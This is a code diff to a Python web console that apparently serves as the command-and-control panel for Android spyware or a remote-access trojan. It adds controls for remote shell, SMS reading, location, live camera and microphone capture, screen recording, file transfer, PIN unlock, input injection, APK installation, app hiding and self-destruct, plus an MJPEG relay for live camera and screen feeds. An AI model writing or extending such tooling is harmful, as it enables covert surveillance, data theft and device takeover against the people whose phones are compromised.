@@ -10,13 +10,13 @@ Pages:
   /                 device list (auto-refresh), online dot, last_seen,
                     battery, IP -> click through to detail
   /device/<id>      device detail: command history + action forms
-                    (shell, files ls/get, sms recent, screen start/stop,
-                    loc once, update, destroy) 1:1 with ghostctl.py verbs
+                    (all ghostctl verbs) 1:1 with ghostctl.py
   /cmd/<id>         result page after a POSTed command
   /broadcast        pick a command + "--all" broadcast execution
-  /stream/<id>      MJPEG/streaming display (tolerates absence: the daemon
-                    does not relay binary media streams yet — the page shows
-                    a waiting state until /stream/<id>/feed responds)
+  /stream/<id>      MJPEG/streaming display; /stream/<id>/feed returns the
+                    latest cached frame as image/jpeg (poll-friendly) and
+                    /stream/<id>/feed.mjpg serves multipart/x-mixed-replace
+                    from the daemon's per-device latest-frame cache
 
 Auth: HTTP Basic (every request). Password from env GHOST_CONSOLE_PASS;
 if unset, a random one is generated and printed at startup.
@@ -51,15 +51,53 @@ HISTORY_FILE = BASE / "history.json"
 # Verbs the console exposes — 1:1 with ghostctl.py's supported set.
 # Each: (action, label, [(argname, placeholder, default), ...], needs_args)
 DEVICE_FORMS = [
-    ("shell",     "shell",            [("arg", "echo hi", "")],               True),
-    ("files ls",  "files ls",         [("arg", "/sdcard", "/sdcard")],        True),
-    ("files get", "files get",        [("arg", "/sdcard/x.jpg", "")],         True),
-    ("sms recent","sms recent",       [("arg", "20", "20")],                  True),
-    ("screen start", "screen start",  [],                                     False),
-    ("screen stop",  "screen stop",   [],                                     False),
-    ("loc once",  "loc once",         [],                                     False),
-    ("update",    "update",           [],                                     False),
-    ("destroy",   "destroy",          [],                                     False),
+    ("shell",           "shell",            [("arg", "echo hi", "")],               True),
+    ("ui dump",         "ui dump",         [],                                     False),
+    ("ui find",        "ui find",         [("arg", "--text Login", "")],          True),
+    ("tap",            "tap",             [("arg", "100 200", "")],               True),
+    ("longclick",      "longclick",       [("arg", "100 200", "")],               True),
+    ("type",           "type",            [("arg", "hello world", "")],           True),
+    ("key",            "key",             [("arg", "4", "")],                     True),
+    ("swipe",          "swipe",           [("arg", "100 200 300 400", "")],       True),
+    ("unlock",         "unlock",          [("arg", "1234", "")],                  True),
+    ("arm",            "arm",             [],                                     False),
+    ("disarm",         "disarm",          [],                                     False),
+    ("sidekick status", "sidekick status", [],                                  False),
+    ("sidekick arm",   "sidekick arm",    [],                                    False),
+    ("sidekick disarm", "sidekick disarm", [],                                   False),
+    ("sidekick ping",  "sidekick ping",   [],                                    False),
+    ("sidekick install", "sidekick install", [("arg", "/sdcard/Download/ghosta.apk", "")], True),
+    ("files ls",       "files ls",         [("arg", "/sdcard", "/sdcard")],        True),
+    ("files tree",     "files tree",       [("arg", "/sdcard --depth 3", "/sdcard")], True),
+    ("files get",      "files get",        [("arg", "/sdcard/x.jpg", "")],         True),
+    ("files put",      "files put",        [("arg", "/sdcard/Download/x.bin", "")], True),
+    ("screen shot",    "screen shot",     [],                                     False),
+    ("screen record",  "screen record",   [("arg", "10 --fps 5", "10")],          True),
+    ("screen live",    "screen live",      [("arg", "--fps 5 --quality 60", "")],  True),
+    ("screen stop",    "screen stop",     [],                                     False),
+    ("screen off",     "screen off",      [],                                     False),
+    ("cam snap",       "cam snap",         [("arg", "back", "back")],              True),
+    ("cam live",       "cam live",         [("arg", "back --quality high", "back")], True),
+    ("cam stop",       "cam stop",        [],                                     False),
+    ("mic record",     "mic record",      [("arg", "10", "10")],                  True),
+    ("mic live",       "mic live",         [],                                     False),
+    ("mic stop",       "mic stop",        [],                                     False),
+    ("brightness get", "brightness get",   [],                                     False),
+    ("brightness set", "brightness set",   [("arg", "10", "10")],                 True),
+    ("volume get",     "volume get",       [("arg", "media", "media")],            True),
+    ("volume set",     "volume set",       [("arg", "media 30", "media 30")],      True),
+    ("volume mute",    "volume mute",      [("arg", "media", "media")],            True),
+    ("volume unmute",  "volume unmute",    [("arg", "media", "media")],            True),
+    ("wake",           "wake",             [],                                     False),
+    ("sms recent",     "sms recent",       [("arg", "20", "20")],                  True),
+    ("loc once",       "loc once",         [],                                     False),
+    ("device info",    "device info",      [],                                     False),
+    ("update",         "update",           [("arg", "sidekick", "sidekick")],      True),
+    ("hide",           "hide",             [],                                     False),
+    ("unhide",         "unhide",           [],                                     False),
+    ("status",         "status",           [],                                     False),
+    ("ping",           "ping",             [],                                     False),
+    ("destroy",        "destroy",          [],                                     False),
 ]
 # Split-verb actions map to (action, args) the way ghostctl.build_args does.
 DANGEROUS = {"destroy"}
@@ -242,16 +280,18 @@ def page_broadcast():
 
 def page_stream(did):
     body = (f"<h1>stream — {e(did)}</h1>"
-            f"<img id='feed' src='/stream/{quote(did)}/feed' alt='stream' "
+            f"<img id='feed' src='/stream/{quote(did)}/feed.mjpg' alt='stream' "
             "style='max-width:100%;background:#000;min-height:60px'>"
             "<p id='note' class=muted>waiting for stream…</p>"
-            "<p class=muted>The daemon does not yet persist/relay binary media "
-            "streams (cam/screen live). This page displays an MJPEG feed from "
-            "<code>/stream/&lt;id&gt;/feed</code> once the daemon exposes one; "
-            "until then it shows a waiting state.</p>"
+            "<p class=muted>Live MJPEG relay: the daemon caches the latest "
+            "frame per active device stream (screen/cam live) and the console "
+            "serves it from <code>/stream/&lt;id&gt;/feed.mjpg</code>. "
+            "Start one with e.g. <code>screen live</code> or "
+            "<code>cam live back</code>. Single-frame poll: "
+            "<code>/stream/&lt;id&gt;/feed</code> (image/jpeg).</p>"
             "<a href='/device/" + quote(did) + "'>&larr; device</a>"
             "<script>feed.onerror=()=>{feed.style.display='none';"
-            "note.textContent='no active stream (daemon stream relay pending)';"
+            "note.textContent='no active stream for this device';"
             "setTimeout(()=>{feed.style.display='';note.textContent='waiting…';"
             "feed.src=feed.src;},3000)};</script>")
     return render(f"stream {did}", body, extra_head="")
@@ -315,8 +355,10 @@ class Handler(BaseHTTPRequestHandler):
             self._send(200, page_broadcast())
         elif p.startswith("/stream/"):
             did = p.split("/", 2)[2]
-            if did.endswith("/feed"):
-                self.stream_feed(did[:-len("/feed")])
+            if did.endswith("/feed.mjpg"):
+                self.stream_mjpg(did[: -len("/feed.mjpg")])
+            elif did.endswith("/feed"):
+                self.stream_feed(did[: -len("/feed")])
             else:
                 self._send(200, page_stream(did))
         elif p == "/favicon.ico":
@@ -357,18 +399,53 @@ class Handler(BaseHTTPRequestHandler):
             self._send(404, render("404", "<h1>404</h1><a href='/'>devices</a>"))
 
     # ---------------------------------------------------------- stream ----
+    def _fetch_frame(self, did):
+        """Latest cached JPEG frame for a device, via the daemon admin port.
+        Returns (stream_name, jpeg_bytes) or (None, error)."""
+        try:
+            resp = ghostctl.rpc({"op": "stream_frame", "device_id": did})
+        except Exception as ex:  # daemon down
+            return None, f"daemon unreachable: {ex}"
+        if not resp.get("ok"):
+            return None, resp.get("error", "no frame")
+        return resp.get("stream"), base64.b64decode(resp["frame_b64"])
+
     def stream_feed(self, did):
-        """MJPEG relay point. The daemon doesn't expose binary streams yet, so
-        this reports 503 (browsers/our <img> just keep waiting/retrying; the
-        stream page shows the waiting state). When the daemon gains a stream
-        op, this handler should emit multipart/x-mixed-replace frames."""
-        note = (f"no active stream for {did} (daemon stream relay not yet "
-                "implemented)").encode()
-        self.send_response(503)
-        self.send_header("Content-Type", "text/plain")
-        self.send_header("Content-Length", str(len(note)))
+        """/stream/<id>/feed — poll-friendly single latest frame (image/jpeg);
+        503 while no stream/frame is cached for the device."""
+        stream, frame = self._fetch_frame(did)
+        if frame is None:
+            self._send(503, f"no active jpeg stream for {did}: {stream}",
+                       ctype="text/plain")
+            return
+        self._send(200, frame, ctype="image/jpeg")
+
+    def stream_mjpg(self, did):
+        """/stream/<id>/feed.mjpg — multipart/x-mixed-replace MJPEG served from
+        the daemon's latest-frame cache. Polls ~5 fps; drops the client when
+        the connection breaks."""
+        self.send_response(200)
+        self.send_header("Content-Type",
+                         "multipart/x-mixed-replace; boundary=frame")
+        self.send_header("Cache-Control", "no-store")
         self.end_headers()
-        self.wfile.write(note)
+        last = b""
+        try:
+            while True:
+                _stream, frame = self._fetch_frame(did)
+                if frame and frame != last:
+                    last = frame
+                    self.wfile.write(b"--frame\r\n")
+                    self.wfile.write(b"Content-Type: image/jpeg\r\n"
+                                     + f"Content-Length: {len(frame)}\r\n\r\n".encode()
+                                     + frame + b"\r\n")
+                    self.wfile.flush()
+                    time.sleep(0.2)
+                else:
+                    time.sleep(0.3)
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError,
+                OSError):
+            pass
 
 
 def main():
